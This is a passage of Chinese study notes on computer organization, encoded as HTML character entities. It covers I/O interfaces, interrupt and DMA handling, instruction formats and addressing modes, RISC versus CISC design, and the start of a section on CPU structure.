x5B58;&#x5668;</td></tr><tr><td>&#x53CD;&#x6620;&#x8BBE;&#x5907;&#x72B6;&#x6001;&#x7684;&#x529F;&#x80FD;</td><td>&#x8BBE;&#x5907;&#x6807;&#x8BB0;&#x72B6;&#x6001;</td></tr></tbody></table><p>&#x63A5;&#x53E3;&#x7C7B;&#x578B;</p><table><thead><tr><th>&#x5206;&#x7C7B;</th><th>&#x79CD;&#x7C7B;</th></tr></thead><tbody><tr><td>&#x6309;&#x6570;&#x636E;&#x4F20;&#x9001;&#x65B9;&#x5F0F;</td><td>&#x5E76;&#x884C;&#x63A5;&#x53E3;(Intel 8255) &#x4E32;&#x884C;&#x63A5;&#x53E3;(Intel 8251)</td></tr><tr><td>&#x6309;&#x529F;&#x80FD;&#x9009;&#x62E9;&#x7684;&#x7075;&#x6D3B;&#x6027;</td><td>&#x53EF;&#x7F16;&#x7A0B;&#x63A5;&#x53E3;(Intel 8255,Intel 8251) &#x4E0D;&#x53EF;&#x7F16;&#x7A0B;&#x63A5;&#x53E3;(Intel 8212)</td></tr><tr><td>&#x6309;&#x901A;&#x7528;&#x6027;</td><td>&#x901A;&#x7528;&#x63A5;&#x53E3;(Intel 8255&#x3001; Intel 8251) &#x4E13;&#x7528;&#x63A5;&#x53E3;(Intel 8279&#x3001; Intel 8275)</td></tr><tr><td>&#x6309;&#x6570;&#x636E;&#x4F20;&#x9001;&#x7684;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</td><td>&#x4E2D;&#x65AD;&#x63A5;&#x53E3;(Intel 8259) DMA&#x63A5;&#x53E3;(Intel 8257)</td></tr></tbody></table><p>&#x7A0B;&#x5E8F;&#x67E5;&#x8BE2;&#x65B9;&#x5F0F;</p><table><thead><tr><th>&#x6307;&#x4EE4;</th><th>&#x4F5C;&#x7528;</th></tr></thead><tbody><tr><td>&#x6D4B;&#x8BD5;&#x6307;&#x4EE4;</td><td>&#x7528;&#x6765;&#x67E5;&#x8BE2;I/O&#x8BBE;&#x5907;&#x5DF2;&#x51C6;&#x5907;&#x5C31;&#x7EEA;</td></tr><tr><td>&#x4F20;&#x9001;&#x6307;&#x4EE4;</td><td>&#x5F53;I/O&#x8BBE;&#x5907;&#x5DF2;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x65F6;&#xFF0C;&#x6267;&#x884C;&#x4F20;&#x9001;&#x6307;&#x4EE4;</td></tr><tr><td>&#x8F6C;&#x79FB;&#x6307;&#x4EE4;</td><td>&#x82E5;I/O&#x8BBE;&#x5907;&#x672A;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#xFF0C;&#x6267;&#x884C;&#x8F6C;&#x79FB;&#x6307;&#x4EE4;&#xFF0C;&#x8F6C;&#x81F3;&#x6D4B;&#x8BD5;&#x6307;&#x4EE4;&#xFF0C;&#x7EE7;&#x7EED;&#x6D4B;&#x8BD5;I/O&#x8BBE;&#x5907;&#x7684;&#x72B6;&#x6001;</td></tr></tbody></table><p>&#x7A0B;&#x5E8F;&#x6D41;&#x7A0B;</p><p>1&#xFF09;CPU&#x53D1;I/O&#x5730;&#x5740;&#x8BBE;&#x5907;&#x5F00;&#x59CB;&#x5DE5;&#x4F5C;&#xFF1B;&#x5730;&#x5740;&#x603B;&#x7EBF;&#xF0AE;&#x63A5;&#x53E3;&#xF0AE;&#x8BBE;&#x5907;&#x9009;&#x62E9;&#x5668;&#x8BD1;&#x7801;&#xF0AE;&#x9009;&#x4E2D;&#xF0AE;&#x53D1;SEL&#x4FE1;&#x53F7;&#xFF1B;2&#xFF09;CPU&#x53D1;&#x542F;&#x52A8;&#x547D;&#x4EE4;DBR&#xF0AE;&#x5F00;&#x547D;&#x4EE4;&#x63A5;&#x6536;&#x95E8;&#xFF1B;&#xF0AE;D&#x7F6E;0&#xFF0C;B&#x7F6E;1&#xF0AE;&#x63A5;&#x53E3;&#x5411;&#x8BBE;&#x5907;&#x53D1;&#x542F;&#x52A8;&#x547D;&#x4EE4;&#xFF1B;3&#xFF09;CPU&#x7B49;&#x5F85;&#xFF0C;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x8BFB;&#x51FA;&#x6570;&#x636E;&#xFF1B;4&#xFF09;&#x5916;&#x8BBE;&#x5DE5;&#x4F5C;&#x5B8C;&#x6210;&#xFF0C;B&#x7F6E;0&#xFF0C;D&#x7F6E;1&#xFF1B;5&#xFF09;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x4FE1;&#x53F7;&#xF0AE;&#x63A5;&#x53E3;&#xF0AE;&#x5B8C;&#x6210;&#x4FE1;&#x53F7;&#xF0AE;&#x63A7;&#x5236;&#x603B;&#x7EBF;&#xF0AE;CPU&#xFF1B;6&#xFF09;&#x8F93;&#x5165;&#xFF1A;CPU&#x901A;&#x8FC7;&#x8F93;&#x5165;&#x6307;&#x4EE4;&#xFF08;IN&#xFF09;&#x5C06;DBR&#x4E2D;&#x7684;&#x6570;&#x636E;&#x53D6;&#x8D70;&#x3002;</p><p>&#x7A0B;&#x5E8F;&#x4E2D;&#x65AD;&#x65B9;&#x5F0F;</p><p>&#x4E2D;&#x65AD;:&#x5728;&#x6267;&#x884C;&#x7A0B;&#x5E8F;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5F53;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x60C5;&#x51B5;&#x6216;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x8BA1;&#x7B97;&#x673A;&#x505C;&#x6B62;&#x73B0;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;&#xFF0C;&#x8F6C;&#x5411;&#x5BF9;&#x8FD9;&#x4E9B;&#x5F02;&#x5E38;&#x60C5;&#x51B5;&#x6216;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x7684;&#x8BF7;&#x6C42;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5904;&#x7406;&#x7ED3;&#x675F;&#x540E;&#x518D;&#x8FD4;&#x56DE;&#x5230;&#x73B0;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x95F4;&#x65AD;&#x5904;&#xFF0C;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x6E90;&#x7A0B;&#x5E8F;&#x3002;</p><p>&#x7A0B;&#x5E8F;&#x4E2D;&#x65AD;&#x65B9;&#x5F0F;&#x914D;&#x7F6E;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x548C;&#x4E2D;&#x65AD;&#x5BC4;&#x5B58;</p><p>&#x63A5;&#x53E3;&#x7535;&#x8DEF;&#x7684;&#x57FA;&#x672C;&#x7EC4;&#x6210;</p><p>&#x4E2D;&#x65AD;&#x5904;&#x7406;&#x8FC7;&#x7A0B;</p><ol><li>CPU&#x54CD;&#x5E94;&#x4E2D;&#x65AD;&#x7684;&#x6761;&#x4EF6;&#x548C;&#x65F6;&#x95F4;</li></ol><p>(1)&#x6761;&#x4EF6;</p><p>&#x5141;&#x8BB8;&#x4E2D;&#x65AD;&#x89E6;&#x53D1;&#x5668; EINT = 1</p><p>&#x7528; &#x5F00;&#x4E2D;&#x65AD; &#x6307;&#x4EE4;&#x5C06; EINT &#x7F6E; &#x201C;1&#x201D;</p><p>&#x7528; &#x5173;&#x4E2D;&#x65AD; &#x6307;&#x4EE4;&#x5C06; EINT &#x7F6E;&#x201C; 0&#x201D; &#x6216;&#x786C;&#x4EF6; &#x81EA;&#x52A8;&#x590D;&#x4F4D;</p><p>(2)&#x65F6;&#x95F4;</p><p>&#x5F53; D = 1&#xFF08;&#x968F;&#x673A;&#xFF09;&#x4E14; MASK = 0 &#x65F6;</p><p>&#x5728;&#x6BCF;&#x6761;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x9636;&#x6BB5;&#x7684;&#x7ED3;&#x675F;&#x524D;</p><p>CPU &#x53D1; &#x4E2D;&#x65AD;&#x67E5;&#x8BE2;&#x4FE1;&#x53F7;&#xFF08;&#x5C06; INTR &#x7F6E;&#x201C;1&#x201D;&#xFF09;</p><ol start="2"><li>I/O&#x4E2D;&#x65AD;&#x5904;&#x7406;&#x8FC7;&#x7A0B;</li></ol><p>1.CPU&#x53D1;&#x542F;&#x52A8;I/O&#x8BBE;&#x5907;&#x547D;&#x4EE4;&#xFF0C;&#x5C06;&#x63A5;&#x53E3;&#x4E2D;&#x7684;B&#x7F6E;1&#xFF0C;D&#x7F6E;0</p><p>2.&#x63A5;&#x53E3;&#x542F;&#x52A8;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x5F00;&#x59CB;&#x5DE5;&#x4F5C;</p><p>3.&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x5C06;&#x6570;&#x636E;&#x9001;&#x5165;&#x6570;&#x636E;&#x7F13;&#x51B2;&#x5BC4;&#x5B58;&#x5668;</p><p>4.&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x5411;&#x63A5;&#x53E3;&#x53D1;&#x51FA;&#x201D;&#x8BBE;&#x5907;&#x5DE5;&#x4F5C;&#x7ED3;&#x675F;&#x201D;&#x4FE1;&#x53F7;&#xFF0C;&#x5C06;D&#x7F6E;1&#xFF0C;B&#x7F6E;0</p><p>5.&#x5F53;&#x8BBE;&#x5907;&#x51C6;&#x5907;&#x5C31;&#x7EEA;(D=1)&#xFF0C;&#x4E14;&#x672C;&#x8BBE;&#x5907;&#x672A;&#x88AB;&#x5C4F;&#x853D;(MASK=0)&#xFF0C;&#x5728;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x9636;&#x6BB5;&#x7684;&#x7ED3;&#x675F;&#x65F6;&#x523B;&#xFF0C;&#x7531;CPU&#x53D1;&#x51FA;&#x4E2D;&#x65AD;&#x67E5;&#x8BE2;&#x4FE1;&#x53F7;</p><p>6.&#x8BBE;&#x5907;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x89E6;&#x53D1;&#x5668;INTR&#x88AB;&#x7F6E;1&#xFF0C;&#x6807;&#x5FD7;&#x8BBE;&#x5907;&#x5411;CPU&#x63D0;&#x51FA;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x3002;&#x4E8E;&#x6B64;&#x540C;&#x65F6;&#xFF0C;INTR&#x88AB;&#x9001;&#x81F3;&#x6392;&#x961F;&#x5668;&#xFF0C;&#x8FDB;&#x884C;&#x4E2D;&#x65AD;&#x4F18;&#x5224;</p><p>7.&#x82E5;CPU&#x5141;&#x8BB8;&#x4E2D;&#x65AD;(EINT=1),&#x8BBE;&#x5907;&#x53C8;&#x88AB;&#x9009;&#x4E2D;&#x6392;&#x961F;&#xFF0C;&#x5373;&#x8FDB;&#x5165;&#x4E2D;&#x65AD;&#x54CD;&#x5E94;&#x9636;&#x6BB5;</p><p>8.&#x5411;&#x91CF;&#x5730;&#x5740;&#x9001;&#x81F3;PC&#xFF0C;&#x4F5C;&#x4E3A;&#x4E0B;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x7684;&#x5730;&#x5740;</p><p>9.&#x65E0;&#x6761;&#x4EF6;&#x8F6C;&#x81F3;&#x8BBE;&#x5907;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x5165;&#x53E3;&#x5730;&#x5740;&#xFF0C;&#x8FDB;&#x5165;&#x4E2D;&#x65AD;&#x670D;&#x52A1;&#x9636;&#x6BB5;</p><p>10.&#x6267;&#x884C;&#x7ED3;&#x675F;&#xFF0C;&#x4E2D;&#x65AD;&#x8FD4;&#x56DE;&#x81F3;&#x539F;&#x7A0B;&#x5E8F;&#x7684;&#x65AD;&#x70B9;&#x5904;</p><p>&#x4E2D;&#x65AD;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x6D41;&#x7A0B;</p><p>&#x4FDD;&#x62A4;&#x73B0;&#x573A;</p><p>&#x4E2D;&#x65AD;&#x670D;&#x52A1;</p><p>&#x6062;&#x590D;&#x73B0;&#x573A;</p><p>&#x4E2D;&#x65AD;&#x8FD4;&#x56DE;</p><p>DMA&#x63A5;&#x53E3;&#x7684;&#x529F;&#x80FD;&#x548C;&#x7EC4;&#x6210;</p><p>DMA&#x63A5;&#x53E3;&#x5177;&#x6709;&#x7684;&#x529F;&#x80FD;</p><p>&#x5411;CPU&#x7533;&#x8BF7;DMA&#x4F20;&#x9001;</p><p>&#x5728;CPU&#x5141;&#x8BB8;DMA&#x5DE5;&#x4F5C;&#x65F6;&#xFF0C;&#x5904;&#x7406;&#x603B;&#x7EBF;&#x63A7;&#x5236;&#x6743;&#x7684;&#x8F6C;&#x4EA4;</p><p>&#x5728;DMA&#x671F;&#x95F4;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x603B;&#x7EBF;&#xFF0C;&#x63A7;&#x5236;&#x6570;&#x636E;&#x4F20;&#x9001;</p><p>&#x786E;&#x5B9A;&#x6570;&#x636E;&#x4F20;&#x9001;&#x7684;&#x6C14;&#x52BF;&#x5730;&#x5740;&#x548C;&#x6570;&#x636E;&#x957F;&#x5EA6;&#xFF0C;&#x4FEE;&#x6B63;&#x6570;&#x636E;&#x4F20;&#x9001;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5730;&#x5740;&#x548C;&#x6570;&#x636E;&#x957F;&#x5EA6;</p><p>&#x5728;&#x6570;&#x636E;&#x5757;&#x4F20;&#x9001;&#x7ED3;&#x675F;&#x65F6;&#xFF0C;&#x7ED9;&#x51FA;DMA&#x64CD;&#x4F5C;&#x5B8C;&#x6210;&#x7684;&#x4FE1;&#x53F7;</p><p>DMA&#x4E0E;&#x4E3B;&#x5B58;&#x4EA4;&#x6362;&#x6570;&#x636E;&#x7684;&#x4E09;&#x79CD;&#x65B9;&#x5F0F;</p><p>1.&#x505C;&#x6B62;CPU&#x8BBF;&#x95EE;&#x4E3B;&#x5B58;</p><p>2.&#x5468;&#x671F;&#x632A;&#x7528;</p><p>3.DMA&#x4E0E;CPU&#x4EA4;&#x66FF;&#x8BBF;&#x95EE;</p><p>DMA&#x57FA;&#x672C;&#x7EC4;&#x6210;</p><p>DMA&#x7684;&#x5DE5;&#x4F5C;&#x8FC7;&#x7A0B;</p><p>&#x9884;&#x5904;&#x7406;&#x3001;&#x6570;&#x636E;&#x4F20;&#x9001;&#x3001;&#x540E;&#x5904;&#x7406;</p><p>DMA&#x65B9;&#x5F0F;&#x4E0E;&#x4E2D;&#x65AD;&#x7A0B;&#x5E8F;&#x7684;&#x6BD4;&#x8F83;</p><table><thead><tr><th></th><th>&#x4E2D;&#x65AD;&#x65B9;&#x5F0F;</th><th>DMA&#x65B9;&#x5F0F;</th></tr></thead><tbody><tr><td>&#x6570;&#x636E;&#x4F20;&#x9001;</td><td>&#x7A0B;&#x5E8F;</td><td>&#x786C;&#x4EF6;</td></tr><tr><td>&#x54CD;&#x5E94;&#x65F6;&#x95F4;</td><td>&#x6307;&#x4EE4;&#x6267;&#x884C;&#x7ED3;&#x675F;</td><td>&#x5B58;&#x53D6;&#x5468;&#x671F;&#x7ED3;&#x675F;</td></tr><tr><td>&#x5904;&#x7406;&#x5F02;&#x5E38;&#x60C5;&#x51B5;</td><td>&#x80FD;</td><td>&#x4E0D;&#x80FD;</td></tr><tr><td>&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;</td><td>&#x4F20;&#x9001;&#x6570;&#x636E;</td><td>&#x540E;&#x5904;&#x7406;</td></tr><tr><td>&#x4F18;&#x5148;&#x7EA7;</td><td>&#x4F4E;</td><td>&#x9AD8;</td></tr></tbody></table><p>&#x4E03;  &#x6307;&#x4EE4;&#x7CFB;&#x7EDF;</p><p>&#x6307;&#x4EE4;&#x7684;&#x4E00;&#x822C;&#x683C;&#x5F0F;</p><p>| &#x64CD;&#x4F5C;&#x7801;&#x5B57;&#x6BB5; | &#x5730;&#x5740;&#x7801;&#x5B57;&#x6BB5; |</p><p>&#x64CD;&#x4F5C;&#x7801; &#x53CD;&#x6620;&#x673A;&#x5668;&#x505A;&#x4EC0;&#x4E48;&#x64CD;&#x4F5C;</p><p>1).&#x957F;&#x5EA6;&#x56FA;&#x5B9A;&#xFF1A;&#x7528;&#x4E8E;&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x8F83;&#x957F;&#x7684;&#x60C5;&#x51B5;&#xFF0C;RISC&#x3002;&#x5982;IBM 370 &#x64CD;&#x4F5C;&#x7801; 8&#x4F4D;</p><p>2).&#x957F;&#x5EA6;&#x53EF;&#x53D8;&#xFF1A;&#x64CD;&#x4F5C;&#x7801;&#x5206;&#x6563;&#x5728;&#x6307;&#x4EE4;&#x5B57;&#x6BB5;&#x7684;&#x4E0D;&#x540C;&#x5B57;&#x6BB5;&#x4E2D;&#x3002;</p><p>&#x6307;&#x4EE4;&#x5B57;&#x957F;</p><p>&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x51B3;&#x5B9A;&#x4E8E;&#x64CD;&#x4F5C;&#x7801;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#x7684;&#x4E2A;&#x6570;</p><p>&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x56FA;&#x5B9A;&#x7684;&#x8BDD;=&#x5B58;&#x50A8;&#x5B57;&#x957F;</p><p>&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x53EF;&#x53D8;&#x7684;&#x8BDD;=&#xFF0C;&#x6309;&#x5B57;&#x8282;&#x7684;&#x500D;&#x6570;&#x53D8;&#x5316;</p><p>&#x64CD;&#x4F5C;&#x6570;&#x7C7B;&#x578B;&#x548C;&#x64CD;&#x4F5C;&#x79CD;&#x7C7B;</p><table><thead><tr><th>&#x7C7B;&#x578B;</th><th>&#x4EE3;&#x8868;</th></tr></thead><tbody><tr><td>&#x5730;&#x5740;</td><td>&#x65E0;&#x7B26;&#x53F7;&#x6574;&#x6570;</td></tr><tr><td>&#x6570;&#x5B57;</td><td>&#x5B9A;&#x70B9;&#x6570;&#x3001;&#x6D6E;&#x70B9;&#x6570;&#x3001;&#x5341;&#x8FDB;&#x5236;&#x6570;</td></tr><tr><td>&#x5B57;&#x7B26;</td><td>ASCII</td></tr><tr><td>&#x903B;&#x8F91;&#x6570;</td><td>&#x903B;&#x8F91;&#x8FD0;&#x7B97;</td></tr></tbody></table><p>&#x64CD;&#x4F5C;&#x7C7B;&#x578B;</p><table><thead><tr><th>&#x64CD;&#x4F5C;&#x7C7B;&#x578B;</th><th>&#x89E3;&#x91CA;</th></tr></thead><tbody><tr><td>&#x6570;&#x636E;&#x4F20;&#x9001;</td><td>&#x5BC4;&#x5B58;&#x5668;-&gt;&#x5BC4;&#x5B58;&#x5668;&#x3001;&#x5BC4;&#x5B58;&#x5668;-&gt;&#x5B58;&#x50A8;&#x5668;&#x7B49;</td></tr><tr><td>&#x7B97;&#x6570;&#x903B;&#x8F91;&#x8FD0;&#x7B97;</td><td>&#x52A0;&#x3001;&#x51CF;&#x3001;&#x4E58;&#x3001;&#x9664;&#x7B49;</td></tr><tr><td>&#x79FB;&#x4F4D;&#x64CD;&#x4F5C;</td><td>&#x7B97;&#x6570;&#x79FB;&#x4F4D;&#x3001;&#x903B;&#x8F91;&#x79FB;&#x4F4D;&#x3001;&#x5FAA;&#x73AF;&#x79FB;&#x4F4D;(&#x5E26;&#x8FDB;&#x4F4D;&#xFF0C;&#x4E0D;&#x5E26;&#x8FDB;&#x4F4D;)</td></tr><tr><td>&#x8F6C;&#x79FB;</td><td>&#x65E0;&#x6761;&#x4EF6;&#x8F6C;&#x79FB;(JMP)&#x3001;&#x6761;&#x4EF6;&#x8F6C;&#x79FB;{&#x7ED3;&#x679C;&#x4E3A;&#x96F6;&#x8F6C;(JZ)&#x3001;&#x7ED3;&#x679C;&#x6EA2;&#x51FA;&#x8F6C;(JO)&#x3001;&#x7ED3;&#x679C;&#x6709;&#x8FDB;&#x4F4D;&#x8F6C;(JC)&#x3001;&#x8DF3;&#x8FC7;&#x4E00;&#x6761;&#x6307;&#x4EE4;(SKP)}</td></tr><tr><td>&#x8C03;&#x7528;&#x548C;&#x8FD4;&#x56DE;</td><td></td></tr><tr><td>&#x9677;&#x9631;(Trap)&#x4E0E;&#x9677;&#x9631;&#x6307;&#x4EE4;</td><td>&#x610F;&#x5916;&#x4E8B;&#x6545;&#x7684;&#x4E2D;&#x65AD;</td></tr><tr><td>&#x8F93;&#x5165;&#x548C;&#x8F93;&#x51FA;</td><td>&#x7AEF;&#x53E3;&#x5730;&#x5740;-&gt;CPU&#x7684;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;CPU&#x7684;&#x5BC4;&#x5B58;&#x5668;-&gt;&#x7AEF;&#x53E3;&#x5730;&#x5740;</td></tr></tbody></table><p>&#x5BFB;&#x5740;&#x65B9;&#x5F0F;</p><table><thead><tr><th>&#x6307;&#x4EE4;&#x5BFB;&#x5740;</th><th>&#x89E3;&#x91CA;</th></tr></thead><tbody><tr><td>&#x987A;&#x5E8F;&#x5BFB;&#x5740;</td><td>&#x81EA;&#x52A8;&#x5F62;&#x6210;&#x4E0B;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x7684;&#x5730;&#x5740;</td></tr><tr><td>&#x8DF3;&#x8DC3;&#x5BFB;&#x5740;</td><td>&#x901A;&#x8FC7;&#x8F6C;&#x79FB;&#x7C7B;&#x6307;&#x4EE4;&#x5B9E;&#x73B0;</td></tr></tbody></table><table><thead><tr><th>&#x6570;&#x636E;&#x5BFB;&#x5740;</th><th>&#x4F8B;&#x5B50;</th></tr></thead><tbody><tr><td>&#x7ACB;&#x5373;&#x5BFB;&#x5740;</td><td>op # A</td></tr><tr><td>&#x76F4;&#x63A5;&#x5BFB;&#x5740;</td><td>EA=A</td></tr><tr><td>&#x9690;&#x542B;&#x5BFB;&#x5740;</td><td>ACC x</td></tr><tr><td>&#x95F4;&#x63A5;&#x5BFB;&#x5740;</td><td>EA=(A)</td></tr><tr><td>&#x5BC4;&#x5B58;&#x5668;&#x5BFB;&#x5740;</td><td>EA=R</td></tr><tr><td>&#x5BC4;&#x5B58;&#x5668;&#x95F4;&#x63A5;&#x5BFB;&#x5740;</td><td>EA=(R)</td></tr><tr><td>&#x57FA;&#x5740;&#x5BFB;&#x5740;</td><td>EA=A+(BR)</td></tr><tr><td>&#x53D8;&#x5740;&#x5BFB;&#x5740;</td><td>EA=A+(IX)</td></tr><tr><td>&#x76F8;&#x5BF9;&#x5BFB;&#x5740;</td><td>EA=(PC)+A</td></tr><tr><td>&#x5806;&#x6808;&#x5BFB;&#x5740;</td><td>PUSH A</td></tr></tbody></table><p>&#x8BBE;&#x8BA1;&#x6307;&#x4EE4;&#x683C;&#x5F0F;&#x5E94;&#x8003;&#x8651;&#x7684;&#x5404;&#x79CD;&#x56E0;&#x7D20;</p><table><thead><tr><th>&#x56E0;&#x7D20;</th><th>&#x8BE6;&#x7EC6;</th></tr></thead><tbody><tr><td>&#x64CD;&#x4F5C;&#x7C7B;&#x578B;</td><td>&#x5305;&#x62EC;&#x6307;&#x4EE4;&#x6570;&#x53CA;&#x64CD;&#x4F5C;&#x7684;&#x96BE;&#x6613;&#x7A0B;&#x5EA6;</td></tr><tr><td>&#x6570;&#x636E;&#x7C7B;&#x578B;</td><td>&#x786E;&#x5B9A;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x53C2;&#x4E0E;&#x64CD;&#x4F5C;</td></tr><tr><td>&#x6307;&#x4EE4;&#x683C;&#x5F0F;</td><td>&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x662F;&#x5426;&#x56FA;&#x5B9A;&#x3001;&#x64CD;&#x4F5C;&#x7801;&#x6570;&#x3001;&#x662F;&#x5426;&#x91C7;&#x7528;&#x6269;&#x5C55;&#x64CD;&#x4F5C;&#x7801;&#x6280;&#x672F;&#xFF0C;&#x5730;&#x5740;&#x7801;&#x4F4D;&#x6570;&#x3001;&#x5730;&#x5740;&#x4E2A;&#x6570;&#x3001;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x7C7B;&#x578B;</td></tr><tr><td>&#x5BFB;&#x5740;&#x65B9;&#x5F0F;</td><td>&#x6307;&#x4EE4;&#x5BFB;&#x5740;&#x3001;&#x64CD;&#x4F5C;&#x6570;&#x5BFB;&#x5740;</td></tr><tr><td>&#x5BC4;&#x5B58;&#x5668;&#x4E2A;&#x6570;</td><td>&#x5BC4;&#x5B58;&#x5668;&#x7684;&#x591A;&#x5C11;&#x76F4;&#x63A5;&#x5F71;&#x54CD;&#x6307;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x65F6;&#x95F4;</td></tr></tbody></table><p>RISC&#x6280;&#x672F;</p><p>RISC:&#x7CBE;&#x7B80;&#x6307;&#x4EE4;&#x7CFB;&#x7EDF;&#x8BA1;&#x7B97;&#x673A;</p><p>CISC:&#x590D;&#x6742;&#x6307;&#x4EE4;&#x7CFB;&#x7EDF;&#x8BA1;&#x7B97;&#x673A;</p><p>RISC&#x7684;&#x4E3B;&#x8981;&#x7279;&#x5F81;</p><p>&#x9009;&#x7528;&#x4F7F;&#x7528;&#x9891;&#x5EA6;&#x8F83;&#x9AD8;&#x7684;&#x4E00;&#x4E9B;&#x7B80;&#x5355;&#x6307;&#x4EE4;&#xFF0C;&#x590D;&#x6742;&#x6307;&#x4EE4;&#x7684;&#x529F;&#x80FD;&#x7531;&#x7B80;&#x5355;&#x6307;&#x4EE4;&#x6765;&#x7EC4;&#x5408;</p><p>&#x6307;&#x4EE4; &#x957F;&#x5EA6;&#x56FA;&#x5B9A;&#x3001;&#x6307;&#x4EE4;&#x683C;&#x5F0F;&#x79CD;&#x7C7B;&#x5C11;&#x3001;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5C11;</p><p>&#x53EA;&#x6709; LOAD / STORE &#x6307;&#x4EE4;&#x8BBF;&#x5B58;</p><p>CPU &#x4E2D;&#x6709;&#x591A;&#x4E2A; &#x901A;&#x7528; &#x5BC4;&#x5B58;&#x5668;</p><p>&#x91C7;&#x7528; &#x6D41;&#x6C34;&#x6280;&#x672F; &#x4E00;&#x4E2A;&#x65F6;&#x949F;&#x5468;&#x671F; &#x5185;&#x5B8C;&#x6210;&#x4E00;&#x6761;&#x6307;&#x4EE4;</p><p>&#x91C7;&#x7528; &#x7EC4;&#x5408;&#x903B;&#x8F91; &#x5B9E;&#x73B0;&#x63A7;&#x5236;&#x5668;</p><p>&#x91C7;&#x7528; &#x4F18;&#x5316; &#x7684; &#x7F16;&#x8BD1; &#x7A0B;&#x5E8F;</p><p>RISC&#x548C;CISC&#x7684;&#x6BD4;&#x8F83;</p><p>RISC&#x66F4;&#x80FD; &#x5145;&#x5206;&#x5229;&#x7528; VLSI &#x82AF;&#x7247;&#x7684;&#x9762;&#x79EF;</p><p>RISC &#x66F4;&#x80FD; &#x63D0;&#x9AD8;&#x8BA1;&#x7B97;&#x673A;&#x8FD0;&#x7B97;&#x901F;&#x5EA6;(&#x6307;&#x4EE4;&#x6570;&#x3001;&#x6307;&#x4EE4;&#x683C;&#x5F0F;&#x3001;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5C11;,&#x901A;&#x7528; &#x5BC4;&#x5B58;&#x5668;&#x591A;&#xFF0C;&#x91C7;&#x7528;&#x7EC4;&#x5408;&#x903B;&#x8F91;&#xFF0C;&#x4FBF;&#x4E8E;&#x5B9E;&#x73B0;&#x6307;&#x4EE4;&#x6D41;&#x6C34;)</p><p>RISC &#x4FBF;&#x4E8E;&#x8BBE;&#x8BA1;&#xFF0C;&#x53EF; &#x964D;&#x4F4E;&#x6210;&#x672C;&#xFF0C;&#x63D0;&#x9AD8; &#x53EF;&#x9760;&#x6027;</p><p>RISC &#x6709;&#x5229;&#x4E8E;&#x7F16;&#x8BD1;&#x7A0B;&#x5E8F;&#x4EE3;&#x7801;&#x4F18;&#x5316;</p><p>RISC &#x4E0D;&#x6613; &#x5B9E;&#x73B0; &#x6307;&#x4EE4;&#x7CFB;&#x7EDF;&#x517C;&#x5BB9;</p><p>&#x516B;  CPU&#x7684;&#x7ED3;&#x6784;</p><p>CPU&#x7684;&#x529F;&#x80FD;</p><p>&#x63A7;&#x5236;&#x5668;&#x7684;&#x529F;&#x80FD;</p><p>&#x53D6;&#x6307;&#x4EE4;&#x3001;&#x5206;&#x6790;&#x6307;&#x4EE4;&#x3001;&#x6267;&#x884C;&#x6307;&#x4EE4;&#xFF0C;&#x53D1;&#x51FA;&#x5404;&#x79CD;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#x3001;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x8F93;&#x5165;&#x53CA;&#x7ED3;&#x679C;&#x7684;&#x8F93;&#x51FA;&#x3001;&#x603B;&#x7EBF;&#x7BA1;&#x7406;&#x3001;&#x5904;&#x7406;&#x5F02;&#x5E38;&#x60C5;&#x51B5;&#x548C;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#xFF1B;&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x6307;&#x4EE4;&#x63A7;&#x5236;&#x3001;&#x64CD;&#x4F5C;&#x63A7;&#x5236;&#x3001;&#x65F6;&#x95F4;&#x63A7;&#x5236;&#x3001;&#x5904;&#x7406;&#x4E2D;&#x65AD;&#x3001;&#x6570;&#x636E;&#x52A0;&#x5DE5;&#x3002;</p><p>&#x8FD0;&#x7B97;&#x5668;&#x7684;&#x529F;&#x80FD;</p><p>&#x5B9E;&#x73B0;&#x7B97;&#x6570;&#x8FD0;&#x7B97;&